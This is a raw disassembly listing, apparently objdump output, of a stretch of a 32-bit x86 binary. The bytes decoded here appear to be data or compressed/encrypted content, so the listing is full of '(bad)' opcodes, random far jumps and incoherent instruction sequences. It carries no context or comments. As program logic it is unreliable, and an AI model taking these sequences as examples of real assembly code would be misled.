  4157da:	sbb    DWORD PTR [ecx+0x6a],eax
  4157dd:	ins    DWORD PTR es:[edi],dx
  4157de:	mov    ds,WORD PTR [ebx+esi*4+0x5b]
  4157e2:	repnz sub ch,BYTE PTR [edi]
  4157e5:	sbb    BYTE PTR ds:[edx+0x1def06ae],ch
  4157ec:	ret    0x44c2
  4157ef:	add    BYTE PTR [edi],0xd1
  4157f2:	and    eax,0x536cebf7
  4157f7:	mov    cs,ebp
  4157f9:	xchg   DWORD PTR [esi-0x53bcf30d],ebp
  4157ff:	jnp    0x4157e4
  415801:	dec    eax
  415802:	and    eax,0x9bea9cb0
  415807:	ja     0x4157ce
  415809:	mov    ss,WORD PTR [ebx+0x1b1073a0]
  41580f:	xor    al,0xb
  415811:	jo     0x4157eb
  415813:	add    edx,ebp
  415815:	dec    esi
  415816:	cdq    
  415817:	dec    edx
  415818:	jne    0x415864
  41581a:	dec    edx
  41581b:	mov    dh,0x53
  41581d:	adc    DWORD PTR [edi+0x61],ecx
  415820:	mov    ch,0x82
  415822:	jae    0x4157f5
  415824:	ret    
  415825:	iret   
  415826:	push   DWORD PTR ds:0xf01b387
  41582c:	(bad)  
  41582d:	mov    ah,0xd3
  41582f:	ret    0xb324
  415832:	popa   
  415833:	xchg   esi,eax
  415834:	gs mov ch,0xb
  415837:	ss mov bh,0x28
  41583a:	mov    esp,0x46eb91f4
  41583f:	or     BYTE PTR [edi-0x7cd56d69],ch
  415845:	(bad)  
  415846:	mov    bh,0xd
  415848:	or     BYTE PTR [ecx-0x1e9dfae4],ch
  41584e:	cmp    DWORD PTR [eax],edx
  415850:	les    ebx,FWORD PTR [edx-0x7f]
  415853:	retf   
  415854:	cmp    ecx,esi
  415856:	outs   dx,DWORD PTR ds:[esi]
  415857:	fwait
  415858:	imul   ebp,DWORD PTR [ebx+0x37],0xde3ec351
  41585f:	jne    0x4158a3
  415861:	pcmpgtb mm2,QWORD PTR [edi-0x6a28bee]
  415868:	dec    esp
  415869:	rol    dl,1
  41586b:	(bad)  
  41586c:	jo     0x415844
  41586e:	adc    eax,DWORD PTR [esi-0x1de054cb]
  415874:	sbb    eax,0x3a0b1489
  415879:	mov    ch,0xf0
  41587b:	mov    dl,0x8f
  41587d:	fcmovnb st,st(1)
  41587f:	jns    0x41586d
  415881:	ss (bad) 
  415883:	fcomi  st,st(1)
  415885:	test   DWORD PTR [eax-0x60],eax
  415888:	pop    es
  415889:	iret   
  41588a:	jmp    0x1f82fa87
  41588f:	add    al,0xd7
  415891:	pushf  
  415892:	push   ebx
  415893:	(bad)  
  415894:	ins    DWORD PTR es:[edi],dx
  415895:	cdq    
  415896:	add    bl,BYTE PTR [edx]
  415898:	jmp    0xda57:0x35cfc766
  41589f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158a0:	pop    edi
  4158a1:	retf   0x5edd
  4158a4:	cwde   
  4158a5:	mov    ah,0x8c
  4158a7:	es inc ecx
  4158a9:	push   es
  4158aa:	push   ebp
  4158ab:	retf   0xa53d
  4158ae:	or     dl,0xa4
  4158b1:	mov    eax,0x9dc242b9
  4158b6:	in     al,dx
  4158b7:	mov    esp,0x2db70d0c
  4158bc:	mov    bl,0x4b
  4158be:	jge    0x415926
  4158c0:	add    bl,ch
  4158c2:	scas   al,BYTE PTR es:[edi]
  4158c3:	dec    esp
  4158c4:	arpl   WORD PTR [ecx+0x5e],cx
  4158c7:	and    ch,BYTE PTR [esp+eiz*8-0x590ff05a]
  4158ce:	dec    edi
  4158cf:	xchg   esi,eax
  4158d0:	and    DWORD PTR [ebx+0x11],0xffffff8b
  4158d4:	outs   dx,BYTE PTR ds:[esi]
  4158d5:	push   es
  4158d6:	mov    ebx,0x2214d086
  4158db:	hlt    
  4158dc:	push   ebp
  4158dd:	sar    BYTE PTR [ebx+0x4d],cl
  4158e0:	and    al,0xea
  4158e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158e3:	hlt    
  4158e4:	rcr    DWORD PTR [ebx+0x7135ce0e],cl
  4158ea:	imul   esp,DWORD PTR [edx+esi*8-0x4fe90bff],0x5
  4158f2:	xor    esp,ebx
  4158f4:	sub    al,0x1d
  4158f6:	cmp    al,0x6a
  4158f8:	out    dx,al
  4158f9:	mov    ebp,0x41a44a2f
  4158fe:	test   ch,ah
  415900:	jb     0x4158c5
  415902:	push   ss
  415903:	cmp    al,0xfe
  415905:	mov    bl,0x5b
  415907:	inc    edx
  415908:	addr16 pop ss
  41590a:	mov    al,0x79
  41590c:	jle    0x4158f2
  41590e:	shl    BYTE PTR [bp+0x6e4c],0xc5
  415914:	(bad)  
  415915:	(bad)  
  415916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415917:	dec    ebp
  415918:	int    0x1a
  41591a:	(bad)  
  41591b:	lods   al,BYTE PTR ds:[esi]
  41591c:	sbb    eax,0x1d82d5da
  415921:	repz fstp QWORD PTR ds:0xc97281d5
  415928:	pop    ebx
  415929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41592a:	addr16 int3 
  41592c:	aam    0xe7
  41592e:	bound  esp,QWORD PTR [edi+0x2a627df8]
  415934:	fwait
  415935:	push   ecx
  415936:	ror    DWORD PTR [esi-0x60b61148],cl
  41593c:	sbb    ebx,DWORD PTR [edi+0x3ddd23f1]
  415942:	str    edx
  415945:	neg    BYTE PTR [ebp-0x35]
  415948:	cmp    eax,0x7cc2bc82
  41594d:	jnp    0x41597d
  41594f:	rcr    DWORD PTR [esi],1
  415951:	mov    BYTE PTR [edi],bh
  415953:	and    edi,DWORD PTR [ecx-0x65a57d59]
  415959:	and    esp,DWORD PTR [esi-0xd]
  41595c:	loopne 0x4159d6
  41595e:	mov    WORD PTR [esi+ebp*2-0x2a4f53f3],?
  415965:	add    esp,DWORD PTR [ebp+esi*8-0x19d4f34a]
  41596c:	sbb    ah,BYTE PTR [esi-0x52]
  41596f:	xchg   ebp,eax
  415970:	push   cs
  415971:	pop    esp
  415972:	(bad)  
  415973:	jns    0x4159b8
  415975:	or     ah,dl
  415977:	fst    DWORD PTR gs:[edx-0x3f]
  41597b:	or     al,0x96
  41597d:	jae    0x41593a
  41597f:	fstp   QWORD PTR [ebp-0x59]
  415982:	shl    edi,cl
  415984:	int    0x5a
  415986:	ins    BYTE PTR es:[edi],dx
  415987:	sbb    DWORD PTR [ecx+0x52],edi
  41598a:	outs   dx,DWORD PTR ds:[esi]
  41598b:	das    
  41598c:	push   es
  41598d:	add    al,BYTE PTR [ecx+0x4a]
  415990:	adc    BYTE PTR [edi-0x54],ah
  415993:	(bad)  
  415994:	sbb    eax,0x717b4f00
  415999:	ins    BYTE PTR es:[edi],dx
  41599a:	sub    al,0xcd
  41599c:	pop    esi
  41599d:	xchg   BYTE PTR [edi],dl
  41599f:	pop    esi
  4159a0:	mov    dh,0xf7
  4159a2:	sub    eax,0x354cb665
  4159a7:	psubusb mm5,QWORD PTR [esi-0x31]
  4159ab:	dec    ebx
  4159ac:	xchg   ebx,eax
  4159ad:	jmp    0x4f5844b9
  4159b2:	jge    0x415a0a
  4159b4:	cmp    BYTE PTR [ecx-0x2f6efc87],ah
  4159ba:	jnp    0x4159ae
	...
  415b8c:	xchg   BYTE PTR [eax-0x30],ah
  415b8f:	dec    eax
  415b90:	idiv   al
  415b92:	sahf   
  415b93:	out    dx,al
  415b94:	or     eax,0x70b0d536
  415b99:	icebp  
  415b9a:	loope  0x415bff
  415b9c:	pop    es
  415b9d:	imul   eax,DWORD PTR [ecx],0x72200
  415ba3:	add    BYTE PTR [ebp-0x42],ah
  415ba6:	jmp    0x415b8e
  415ba8:	hlt    
  415ba9:	jecxz  0x415b6a
  415bab:	pcmpgtb mm7,mm3
  415bae:	pop    edi
  415baf:	mov    BYTE PTR [edi],dl
  415bb1:	repz sahf 
  415bb3:	mov    BYTE PTR [edi],al
  415bb5:	(bad)  
  415bb6:	shl    DWORD PTR [edx-0x4c],cl
  415bb9:	sub    dh,BYTE PTR [ecx+esi*2]
  415bbc:	scas   eax,DWORD PTR es:[edi]
  415bbd:	adc    bh,BYTE PTR [ebp+esi*8-0x272f556]
  415bc4:	and    DWORD PTR [ebx-0x4d],0x946d9e96
  415bcb:	mov    dh,BYTE PTR [ebx+0x13ae132b]
  415bd1:	stos   BYTE PTR es:[edi],al
  415bd2:	jmp    0x2097730b
  415bd7:	mov    BYTE PTR [ecx-0x257f4ec4],ah
  415bdd:	sub    esi,ecx
  415bdf:	or     eax,0x8a775352
  415be4:	mov    cl,0x72
  415be6:	inc    ebp
  415be7:	xchg   ebx,eax
  415be8:	repz int 0xc3
  415beb:	mov    edi,0xa2d5afde
  415bf0:	rol    ebp,cl
  415bf2:	lock jg 0x415bd8
  415bf5:	nop
  415bf6:	lahf   
  415bf7:	sub    edi,DWORD PTR [ecx]
  415bf9:	jmp    0xb4c7ef5f
  415bfe:	xchg   ecx,eax
  415bff:	mov    ecx,0x958e6aec
  415c04:	push   ebp
  415c05:	pop    edx
  415c06:	gs mov ch,0x45
  415c09:	xor    edi,DWORD PTR [eax+0x23b144aa]
  415c0f:	mov    ecx,0x72e8f6a
  415c14:	mov    cl,0xc2
  415c16:	cmp    eax,DWORD PTR [eax]
  415c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c19:	push   esi
  415c1a:	or     BYTE PTR [ecx-0x78],dh
  415c1d:	(bad)  
  415c1e:	sbb    ebp,DWORD PTR [eax-0x72dc694]
  415c24:	scas   al,BYTE PTR es:[edi]
  415c25:	ds je  0x415bec
  415c28:	add    eax,0x9811d44a
  415c2d:	push   0x846d80b9
  415c32:	cmc    
  415c33:	jmp    0x60f9d7b1
  415c38:	mov    edi,0x6d3922d3
  415c3d:	pop    ebp
  415c3e:	xchg   ebx,eax
  415c3f:	push   ebp
  415c40:	sub    DWORD PTR [ecx+0x4f819a36],ebx
  415c46:	xchg   esp,eax
  415c47:	pop    ebp
  415c48:	cmp    BYTE PTR ds:0xaba4a029,0x48
  415c4f:	xor    al,0x3c
  415c51:	lock cmp dl,al
  415c54:	add    BYTE PTR [ebx+0x7d],0xdc
  415c58:	cld    
  415c59:	cmove  esi,DWORD PTR [ebp-0x67]
  415c5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c5e:	push   edi
  415c5f:	fisttp QWORD PTR [ebx]
  415c61:	pop    edx
  415c62:	fcmovu st,st(7)
  415c65:	xchg   BYTE PTR [esi],ch
  415c67:	in     eax,dx
  415c68:	sbb    DWORD PTR [edx+0x77f728d9],esi
  415c6e:	mov    dh,0xa5
  415c70:	mov    ch,0xd3
  415c72:	in     al,dx
  415c73:	jle    0x415cf4
  415c75:	ja     0x415ce2
  415c77:	mov    ds:0x2315a80d,al
  415c7c:	dec    ebx
  415c7d:	add    edi,DWORD PTR [esp+esi*1-0x2b41e32d]
  415c84:	ror    ah,0xa7
  415c87:	(bad)  
  415c88:	jmp    DWORD PTR [ebx+0x2634fafd]
  415c8e:	add    esi,ebp
  415c90:	jl     0x415c9c
  415c92:	jmp    0x9b73:0xdea82958
  415c99:	pop    es
  415c9a:	dec    esp
  415c9b:	pop    es
  415c9c:	aad    0x4a
  415c9e:	cmp    ch,BYTE PTR [edi+0x13d6595b]
  415ca4:	fcmovbe st,st(4)
  415ca6:	pop    es
  415ca7:	fidiv  DWORD PTR [ebp-0x4]
  415caa:	rol    BYTE PTR [esi],0x3f
  415cad:	mov    cl,0x2
  415caf:	fldl2t 
  415cb1:	jmp    0x415c62
  415cb3:	test   DWORD PTR [edi],esp
  415cb5:	(bad)  
  415cb6:	push   esp
  415cb7:	fistp  DWORD PTR [edx-0x29]
  415cba:	pushf  
  415cbb:	in     al,dx
  415cbc:	pop    ecx
  415cbd:	lods   eax,DWORD PTR ds:[esi]
  415cbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cbf:	or     eax,0xe05cdbdb
  415cc4:	repz call 0x415d:0xfc37e140
  415ccc:	cld    
  415ccd:	push   cs
  415cce:	adc    eax,0xf9a7c2fe
  415cd3:	jge    0x415cf5
  415cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cd6:	dec    eax
  415cd7:	push   edi
  415cd8:	jnp    0x415cca
  415cda:	mov    WORD PTR [edx],ds
  415cdc:	xchg   esi,eax
  415cdd:	xlat   BYTE PTR ds:[ebx]
  415cde:	adc    eax,0x10db46f4
  415ce3:	aad    0xcd
  415ce5:	and    BYTE PTR [esi+0x4b8b5295],dh
  415ceb:	pop    edi
  415cec:	sub    BYTE PTR [edi+0x12fdcbb5],dl
  415cf2:	test   al,0xc4
  415cf4:	and    DWORD PTR [edx+0x7116bc33],ecx
  415cfa:	leave  
  415cfb:	ds ds dec ebp
  415cfe:	cmp    bh,ch
  415d00:	popa   
  415d01:	bound  ecx,QWORD PTR [eax]
  415d03:	mov    dh,0xbf
  415d05:	in     al,0xe
  415d07:	lahf   
  415d08:	or     DWORD PTR [ebp-0x11],0xaa83ffaf
  415d0f:	sub    eax,0x71e5347a
  415d14:	inc    edi
  415d15:	adc    al,0x56
  415d17:	push   ds
  415d18:	loopne 0x415ccf
  415d1a:	stc    
  415d1b:	loopne 0x415d1a
  415d1d:	out    dx,eax
  415d1e:	xor    BYTE PTR [ecx],0xdf
  415d21:	clc    
  415d22:	shl    BYTE PTR [edx+0x77],0xa7
  415d26:	lods   eax,DWORD PTR ds:[esi]
  415d27:	jmp    0x415d63
  415d29:	jbe    0x415d0b
  415d2b:	daa    
  415d2c:	sbb    BYTE PTR [edi],dl
  415d2e:	fsubp  st(2),st
  415d30:	mov    BYTE PTR ds:0x5c554cad,dl
  415d36:	ret    0x7fa7
  415d39:	loope  0x415db0
  415d3b:	aad    0xf7
  415d3d:	dec    ebx
  415d3e:	mov    cl,0x35
  415d40:	imul   ebx,ebx,0x5b9b9627
  415d46:	fst    QWORD PTR [ecx+0x33de6951]
  415d4c:	jno    0x415d3e
  415d4e:	jg     0x415d2d
  415d50:	adc    eax,0xabf73f80
  415d55:	push   0x7c
  415d57:	and    al,0x71
  415d59:	and    eax,0xaa8c1604
  415d5e:	enter  0xe838,0xff
  415d62:	cmc    
  415d63:	pusha  
  415d64:	daa    
  415d65:	shl    BYTE PTR [eax+0x5],1
  415d68:	xchg   ebx,eax
  415d69:	jae    0x415dea
  415d6b:	mov    ecx,0xf90901cc
  415d70:	jne    0x415da6
  415d72:	sub    BYTE PTR [edx-0x75],ah
  415d75:	jl     0x415d66
  415d77:	jmp    0x5c71:0x830e9bfb
  415d7e:	inc    esp
  415d7f:	xor    DWORD PTR [ebx-0x20fd9931],edx
  415d85:	gs je  0x415dc7
  415d88:	mov    ecx,0xe5fb4011
  415d8d:	mov    ch,0xc4
  415d8f:	xchg   ecx,eax
  415d90:	bnd jo 0x415dd6
  415d93:	mov    eax,0x356dca81
  415d98:	mov    cs,WORD PTR [esi-0x11c0de0a]
  415d9e:	xchg   esp,eax
  415d9f:	(bad)  
  415da0:	push   edi
  415da1:	test   DWORD PTR [ebx],0xc3760c4
  415da7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415da8:	popa   
  415da9:	shr    eax,cl
  415dab:	out    dx,eax
  415dac:	(bad)  
  415dae:	es shl ecx,cl
  415db1:	jns    0x415d8e
  415db3:	(bad)  
  415db4:	cs ins BYTE PTR es:[edi],dx
  415db6:	or     ah,bh
  415db8:	out    dx,eax
  415db9:	add    DWORD PTR [esi-0x5d],ebp
  415dbc:	fidivr DWORD PTR ds:0x383d7e38
  415dc2:	retf   
  415dc3:	mov    ch,0xef
  415dc5:	pop    edi
  415dc6:	test   al,0xaf
  415dc8:	out    dx,eax
  415dc9:	(bad)  
  415dcb:	push   esi
  415dcc:	aaa    
  415dcd:	jecxz  0x415da0
  415dcf:	xor    bl,BYTE PTR [edx]
  415dd1:	ror    edx,cl
  415dd3:	or     dl,dl
  415dd5:	push   0xa59684a7
  415dda:	xor    edx,ebp
  415ddc:	cld    
  415ddd:	inc    ebx
  415dde:	adc    al,0xb5
  415de0:	inc    ecx
  415de1:	mov    sp,?
  415de4:	out    dx,eax
  415de5:	dec    ecx
  415de6:	mov    BYTE PTR [edx],bh
  415de8:	int    0xcc
  415dea:	shl    BYTE PTR [edx+edi*4+0x55],cl
  415dee:	in     al,0x14
  415df0:	sahf   
  415df1:	push   edi
  415df2:	pop    ecx
  415df3:	cwde   
  415df4:	xchg   edx,eax
  415df5:	cmp    eax,0xcbd83fb8
  415dfa:	and    edx,DWORD PTR [eax-0x63]
  415dfd:	and    al,BYTE PTR [eax]
  415dff:	mov    WORD PTR [esi+0x647e4c44],ds
  415e05:	push   ss
  415e06:	or     al,0x1f
  415e08:	add    DWORD PTR [edx],edi
  415e0a:	jmp    0xefaa6e1a
  415e0f:	in     eax,0x13
  415e11:	mov    ebx,0x50eae829
  415e16:	jg     0x415e28
  415e18:	adc    BYTE PTR [ecx+0x1],cl
  415e1b:	lahf   
  415e1c:	shl    esi,0x68
  415e1f:	push   eax
  415e20:	popa   
  415e21:	and    esi,DWORD PTR [ecx]
  415e23:	mov    fs,ebp
  415e25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e26:	xor    al,bh
  415e28:	cli    
  415e29:	out    0x99,al
  415e2b:	stc    
  415e2c:	xchg   edx,eax
  415e2d:	push   cs
  415e2e:	enter  0x7892,0x55
  415e32:	mov    al,ds:0x5d739955
  415e37:	inc    ebp
  415e38:	(bad)  
  415e39:	xor    bh,BYTE PTR [ebx+edi*2+0x60d60ff6]
  415e40:	das    
  415e41:	cmp    eax,0x855c46c
  415e46:	pop    esi
  415e47:	sahf   
  415e48:	add    al,0xb
  415e4a:	jmp    0xb0f1:0x9954e421
  415e51:	addr16 cli 
  415e53:	mov    ch,0xac
  415e55:	rol    esp,0x58
  415e58:	imul   edi,DWORD PTR [ecx+0x1e9bca3a],0x34
  415e5f:	cmp    ch,BYTE PTR [ecx-0x2284402b]
  415e65:	mov    ah,0x43
  415e67:	shl    DWORD PTR [edx-0x42e3772d],0x99
  415e6e:	loopne 0x415eb2
  415e70:	cmp    dh,bh
  415e72:	mov    al,ds:0xee8d3b4e
  415e77:	cmc    
  415e78:	int3   
  415e79:	mov    fs,WORD PTR [edi-0x23]
  415e7c:	mov    ch,0x6a
  415e7e:	dec    esp
  415e7f:	jo     0x415ece
  415e81:	push   esi
  415e82:	dec    edx
  415e83:	jo     0x415e1b
  415e85:	test   eax,0xe93e7e60
  415e8a:	mov    eax,ds:0xdf80d0dc
  415e8f:	das    
  415e90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e91:	mov    bh,0x5
  415e93:	call   0xde69e0
  415e98:	(bad)  
  415e99:	les    ecx,FWORD PTR [edx-0x6ff913d6]
  415e9f:	or     ebp,eax
  415ea1:	(bad)  
  415ea2:	stc    
  415ea3:	mov    gs,WORD PTR [edi]
  415ea5:	sahf   
  415ea6:	push   esi
  415ea7:	mov    cl,0xfc
  415ea9:	fadd   DWORD PTR [ecx-0x3f63f251]
  415eaf:	sbb    eax,0x2f09c909
  415eb4:	lock popa 
  415eb6:	dec    esp
  415eb7:	jns    0x415f21
  415eb9:	fbld   TBYTE PTR [edi-0x1c5d8a41]
  415ebf:	sub    BYTE PTR [esi-0x62],bl
  415ec2:	lock xchg edi,eax
  415ec4:	retf   
  415ec5:	xchg   ecx,esp
  415ec7:	sub    eax,eax
  415ec9:	jle    0x415ef6
  415ecb:	shl    DWORD PTR [ecx+0x72],cl
  415ece:	cmp    al,0xa5
  415ed0:	sahf   
  415ed1:	cmp    BYTE PTR ds:0xc028b1fe,ch
  415ed7:	jmp    DWORD PTR [edx+0x292985cc]
  415edd:	jbe    0x415e8b
  415edf:	add    BYTE PTR [edx-0x159c1e24],dh
  415ee5:	sti    
  415ee6:	push   edx
  415ee7:	popa   
  415ee8:	sbb    DWORD PTR [esi],ebp
  415eea:	js     0x415ed3
  415eec:	or     eax,0x2938e7eb
  415ef1:	lahf   
  415ef2:	iret   
  415ef3:	rol    cl,0x1d
  415ef6:	repz mov eax,ds:0x89265ec7
  415efc:	ja     0x415ea6
  415efe:	aad    0x36
  415f00:	xchg   BYTE PTR [esi],dh
  415f02:	inc    ebp
  415f03:	xor    dh,dl
  415f05:	es push 0xffffffd8
  415f08:	js     0x415ec3
  415f0a:	sbb    bh,BYTE PTR [ebx-0x52f663f5]
  415f10:	call   0x4c5e2470
  415f15:	pop    edx
  415f16:	mov    ebx,cs
  415f18:	push   ebp
  415f19:	mov    eax,0x557347b1
  415f1e:	jg     0x415ea6
  415f20:	pop    es
  415f21:	mov    eax,0x63e4bca6
  415f26:	sti    
  415f27:	out    dx,eax
  415f28:	in     al,0x9b
  415f2a:	xor    DWORD PTR [eax+0x56],ecx
  415f2d:	and    eax,0xd6a643b8
  415f32:	xor    BYTE PTR [edx-0x11],dl
  415f35:	test   BYTE PTR [esi+0x42],al
  415f38:	dec    ebp
  415f39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f3a:	sbb    al,0xa1
  415f3c:	call   0x1294dde
  415f41:	ret    
  415f42:	inc    esi
  415f43:	inc    ebp
  415f44:	jbe    0x415fa0
  415f46:	test   eax,0x414ada05
  415f4b:	lahf   
  415f4c:	outs   dx,DWORD PTR ds:[esi]
  415f4d:	aad    0x73
  415f4f:	cmc    
  415f50:	(bad)  
  415f51:	adc    DWORD PTR ds:0x78710625,ebx
  415f57:	call   eax
  415f59:	es in  eax,dx
  415f5b:	sbb    eax,ecx
  415f5d:	sub    ebx,DWORD PTR [ecx-0x10364ae9]
  415f63:	dec    edx
  415f64:	jmp    0xb33cd901
  415f69:	cmp    al,0x2f
  415f6b:	push   cs
  415f6c:	cs sub eax,esi
  415f6f:	fist   DWORD PTR [ecx+0x4d]
  415f72:	push   esi
  415f73:	xlat   BYTE PTR ds:[ebx]
  415f74:	cli    
  415f75:	or     al,0x9c
  415f77:	retf   0x2a53
  415f7a:	and    BYTE PTR [edx+0x36],bh
  415f7d:	dec    ebx
  415f7e:	cwde   
  415f7f:	and    al,0x3f
  415f81:	mov    ch,0x6
  415f83:	mov    ds:0xf0e45e1d,eax
  415f88:	retf   0xa503
  415f8b:	std    
  415f8c:	jg     0x415fe2
  415f8e:	test   BYTE PTR [esi+0x25072aa7],cl
  415f94:	mov    esp,0xa7f6a371
  415f99:	arpl   WORD PTR [esp+ebx*4-0x120fa43],dx
  415fa0:	ja     0x415fd5
  415fa2:	sbb    DWORD PTR [esp+eax*4+0xec26ba0],ebx
  415fa9:	inc    edx
  415faa:	ds jmp 0xd394:0x4cf6d0cb
  415fb2:	add    DWORD PTR ds:0xa6a0e603,ebp
  415fb8:	jle    0x415f7b
  415fba:	inc    eax
  415fbb:	leave  
  415fbc:	jge    0x415f7a
  415fbe:	shrd   edi,edx,cl
  415fc1:	gs xchg esi,eax
  415fc3:	dec    ebp
  415fc4:	loope  0x415ffe
  415fc6:	jno    0x415f97
  415fc8:	jne    0x415fd3
  415fca:	sbb    DWORD PTR [ecx*4+0x1ab82b11],0x496e599f
  415fd5:	mov    dl,0xa1
  415fd7:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fd9:	pop    edi
  415fda:	cmp    ah,bl
  415fdc:	mov    ds:0x32ade8ce,eax
  415fe1:	ret    
  415fe2:	push   edx
  415fe3:	pop    ebx
  415fe4:	jne    0x415f81
  415fe6:	xchg   BYTE PTR [edi-0x31],bh
  415fe9:	sbb    ch,BYTE PTR [ebp+0x62]
  415fec:	int    0x33
  415fee:	push   DWORD PTR [eax]
  415ff0:	adc    BYTE PTR [esi+0x78],ah
  415ff3:	fist   DWORD PTR ds:0xc346918
  415ff9:	shr    BYTE PTR [edi-0x24df99c5],0x58
  416000:	les    ecx,FWORD PTR [edi-0xb]
  416003:	inc    ecx
  416004:	pop    esp
  416005:	mov    ?,WORD PTR [esi+ecx*8+0x28]
  416009:	cld    
  41600a:	retf   
  41600b:	or     DWORD PTR [ecx+0x684fdecd],edx
  416011:	sahf   
  416012:	mov    esi,DWORD PTR ds:0xaa589ef3
  416018:	dec    esi
  416019:	dec    esi
  41601a:	int3   
  41601b:	nop
  41601c:	lahf   
  41601d:	popf   
  41601e:	xchg   esi,eax
  41601f:	outs   dx,BYTE PTR ds:[esi]
  416020:	and    ch,BYTE PTR [esi-0x68]
  416023:	adc    DWORD PTR [edi-0x77264408],esp
  416029:	push   eax
  41602a:	push   0xffffffc0
  41602c:	or     DWORD PTR [edi-0x6a6ab73d],0xeb2ae83c
  416036:	imul   BYTE PTR [eax]
  416038:	adc    eax,0xcde4efd2
  41603d:	push   esi
  41603e:	mov    al,ch
  416040:	jle    0x416066
  416042:	ret    
  416043:	fimul  WORD PTR [ebp+0x644a2b7d]
  416049:	ret    0xcac3
  41604c:	out    dx,eax
  41604d:	pop    ebx
  41604e:	xchg   edx,eax
  41604f:	pop    ebx
  416050:	dec    ecx
  416051:	and    edi,DWORD PTR [ecx]
  416053:	inc    edi
  416054:	add    edx,edx
  416056:	push   edi
  416057:	xchg   esi,eax
  416058:	mov    ah,BYTE PTR [eax-0x6421b253]
  41605e:	xchg   edi,eax
  41605f:	gs dec edi
  416061:	xor    edx,DWORD PTR [ecx+eax*1]
  416064:	ret    0xa6f7
  416067:	out    0x8d,al
  416069:	dec    ebp
  41606a:	fild   DWORD PTR ds:0xab2e66ae
  416070:	push   0x6c
  416072:	sahf   
  416073:	push   ds
  416074:	sbb    eax,DWORD PTR [edx+0x36]
  416077:	and    eax,0x215761ac
  41607c:	das    
  41607d:	nop
  41607e:	ja     0x4160e5
  416080:	dec    esp
  416081:	mov    WORD PTR [eax+0x793a5b70],cs
  416087:	fldenv [edx+0x7064a7a]
  41608d:	mov    dh,0xae
  41608f:	sbb    BYTE PTR [ebx+0x12e5d294],cl
  416095:	add    DWORD PTR [ecx],esi
  416097:	hlt    
  416098:	mov    BYTE PTR [ecx-0x601dabcb],bh
  41609e:	jmp    FWORD PTR [edx+0x5a]
  4160a1:	mov    ch,0x45
  4160a3:	jecxz  0x416087
  4160a5:	sbb    DWORD PTR cs:[ebx-0x47],esp
  4160a9:	fs pop edi
  4160ab:	std    
  4160ac:	fisub  DWORD PTR [ebp+0xa]
  4160af:	sbb    ebp,DWORD PTR [eax]
  4160b1:	push   ebp
  4160b2:	mov    ebp,0x331e3a13
  4160b7:	out    dx,al
  4160b8:	jns    0x41608c
  4160ba:	or     eax,0x620ece11
  4160bf:	cmp    DWORD PTR [ebp+0x4a4ef9b2],esi
  4160c5:	lahf   
  4160c6:	or     eax,0xaeb8cf52
  4160cb:	loopne 0x41605a
  4160cd:	jecxz  0x4160e9
  4160cf:	into   
  4160d0:	inc    ecx
  4160d1:	enter  0xaf3c,0x2f
  4160d5:	inc    ebx
  4160d6:	adc    ecx,esi
  4160d8:	sub    DWORD PTR [ecx],esi
  4160da:	ins    BYTE PTR es:[edi],dx
  4160db:	and    DWORD PTR [ebp+0x320de0c1],esi
  4160e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160e2:	jbe    0x41614d
  4160e4:	cdq    
  4160e5:	xchg   BYTE PTR [edx+ebx*8],ch
  4160e8:	fsincos 
  4160ea:	push   ecx
  4160eb:	aam    0xd2
  4160ed:	jo     0x41611b
  4160ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160f0:	xor    DWORD PTR [esi-0x1c],esi
  4160f3:	fxch   st(6)
  4160f5:	neg    DWORD PTR [ebx]
  4160f7:	in     eax,dx
  4160f8:	inc    edi
  4160f9:	xor    esp,DWORD PTR [ebx-0x2f6c2b88]
  4160ff:	(bad)  
  416100:	int    0xe8
  416102:	jbe    0x4160d5
  416104:	shl    BYTE PTR [ecx+0x67],cl
  416107:	jge    0x416131
  416109:	or     al,BYTE PTR [esi+0xd785e4e]
  41610f:	jp     0x416099
  416111:	sub    bl,0xb6
  416114:	push   ss
  416115:	stc    
  416116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416117:	sahf   
  416118:	fisttp DWORD PTR [ecx-0x71f16721]
  41611e:	mov    ds:0x99d8470c,al
  416123:	pop    eax
  416124:	fld    QWORD PTR [esi-0x7d14a4e6]
  41612a:	sar    BYTE PTR [edx],0x51
  41612d:	push   0xffffffa8
  41612f:	rcr    eax,1
  416131:	and    al,0x37
  416133:	sahf   
  416134:	cld    
  416135:	cmp    eax,DWORD PTR [esp+eax*8]
  416138:	les    ebx,FWORD PTR ds:0xcad1bfe1
  41613e:	pop    esp
  41613f:	fbld   TBYTE PTR [edi+0x70d533ce]
  416145:	cmp    al,0xa2
  416147:	sti    
  416148:	and    DWORD PTR [esi+0x53],eax
  41614b:	stos   BYTE PTR es:[edi],al
  41614c:	fcmovu st,st(0)
  41614e:	stos   BYTE PTR es:[edi],al
  41614f:	inc    ebp
  416150:	adc    BYTE PTR [ecx-0x51],ch
  416153:	retf   0x1ca6
  416156:	aaa    
  416157:	fnstsw WORD PTR [ecx-0x5f8950b0]
  41615d:	and    BYTE PTR [ebp+0x3ce5ed15],0xe9
  416164:	mov    ds:0xc0cc5040,eax
  416169:	push   esi
  41616a:	cs jno 0x416136
  41616d:	push   eax
  41616e:	sbb    edi,DWORD PTR [eax]
  416170:	push   ecx
  416171:	and    eax,esp
  416173:	dec    ebx
  416174:	mov    bl,0x4a
  416176:	xchg   BYTE PTR [eax+eiz*1-0x78223f51],ah
  41617d:	fcom   QWORD PTR [ecx+0x26]
  416180:	and    eax,0x56eba414
  416185:	cmp    esp,edx
  416187:	int    0xfb
  416189:	mov    eax,ds:0x4de364dc
  41618e:	mov    ch,0xe8
  416190:	out    0xc5,eax
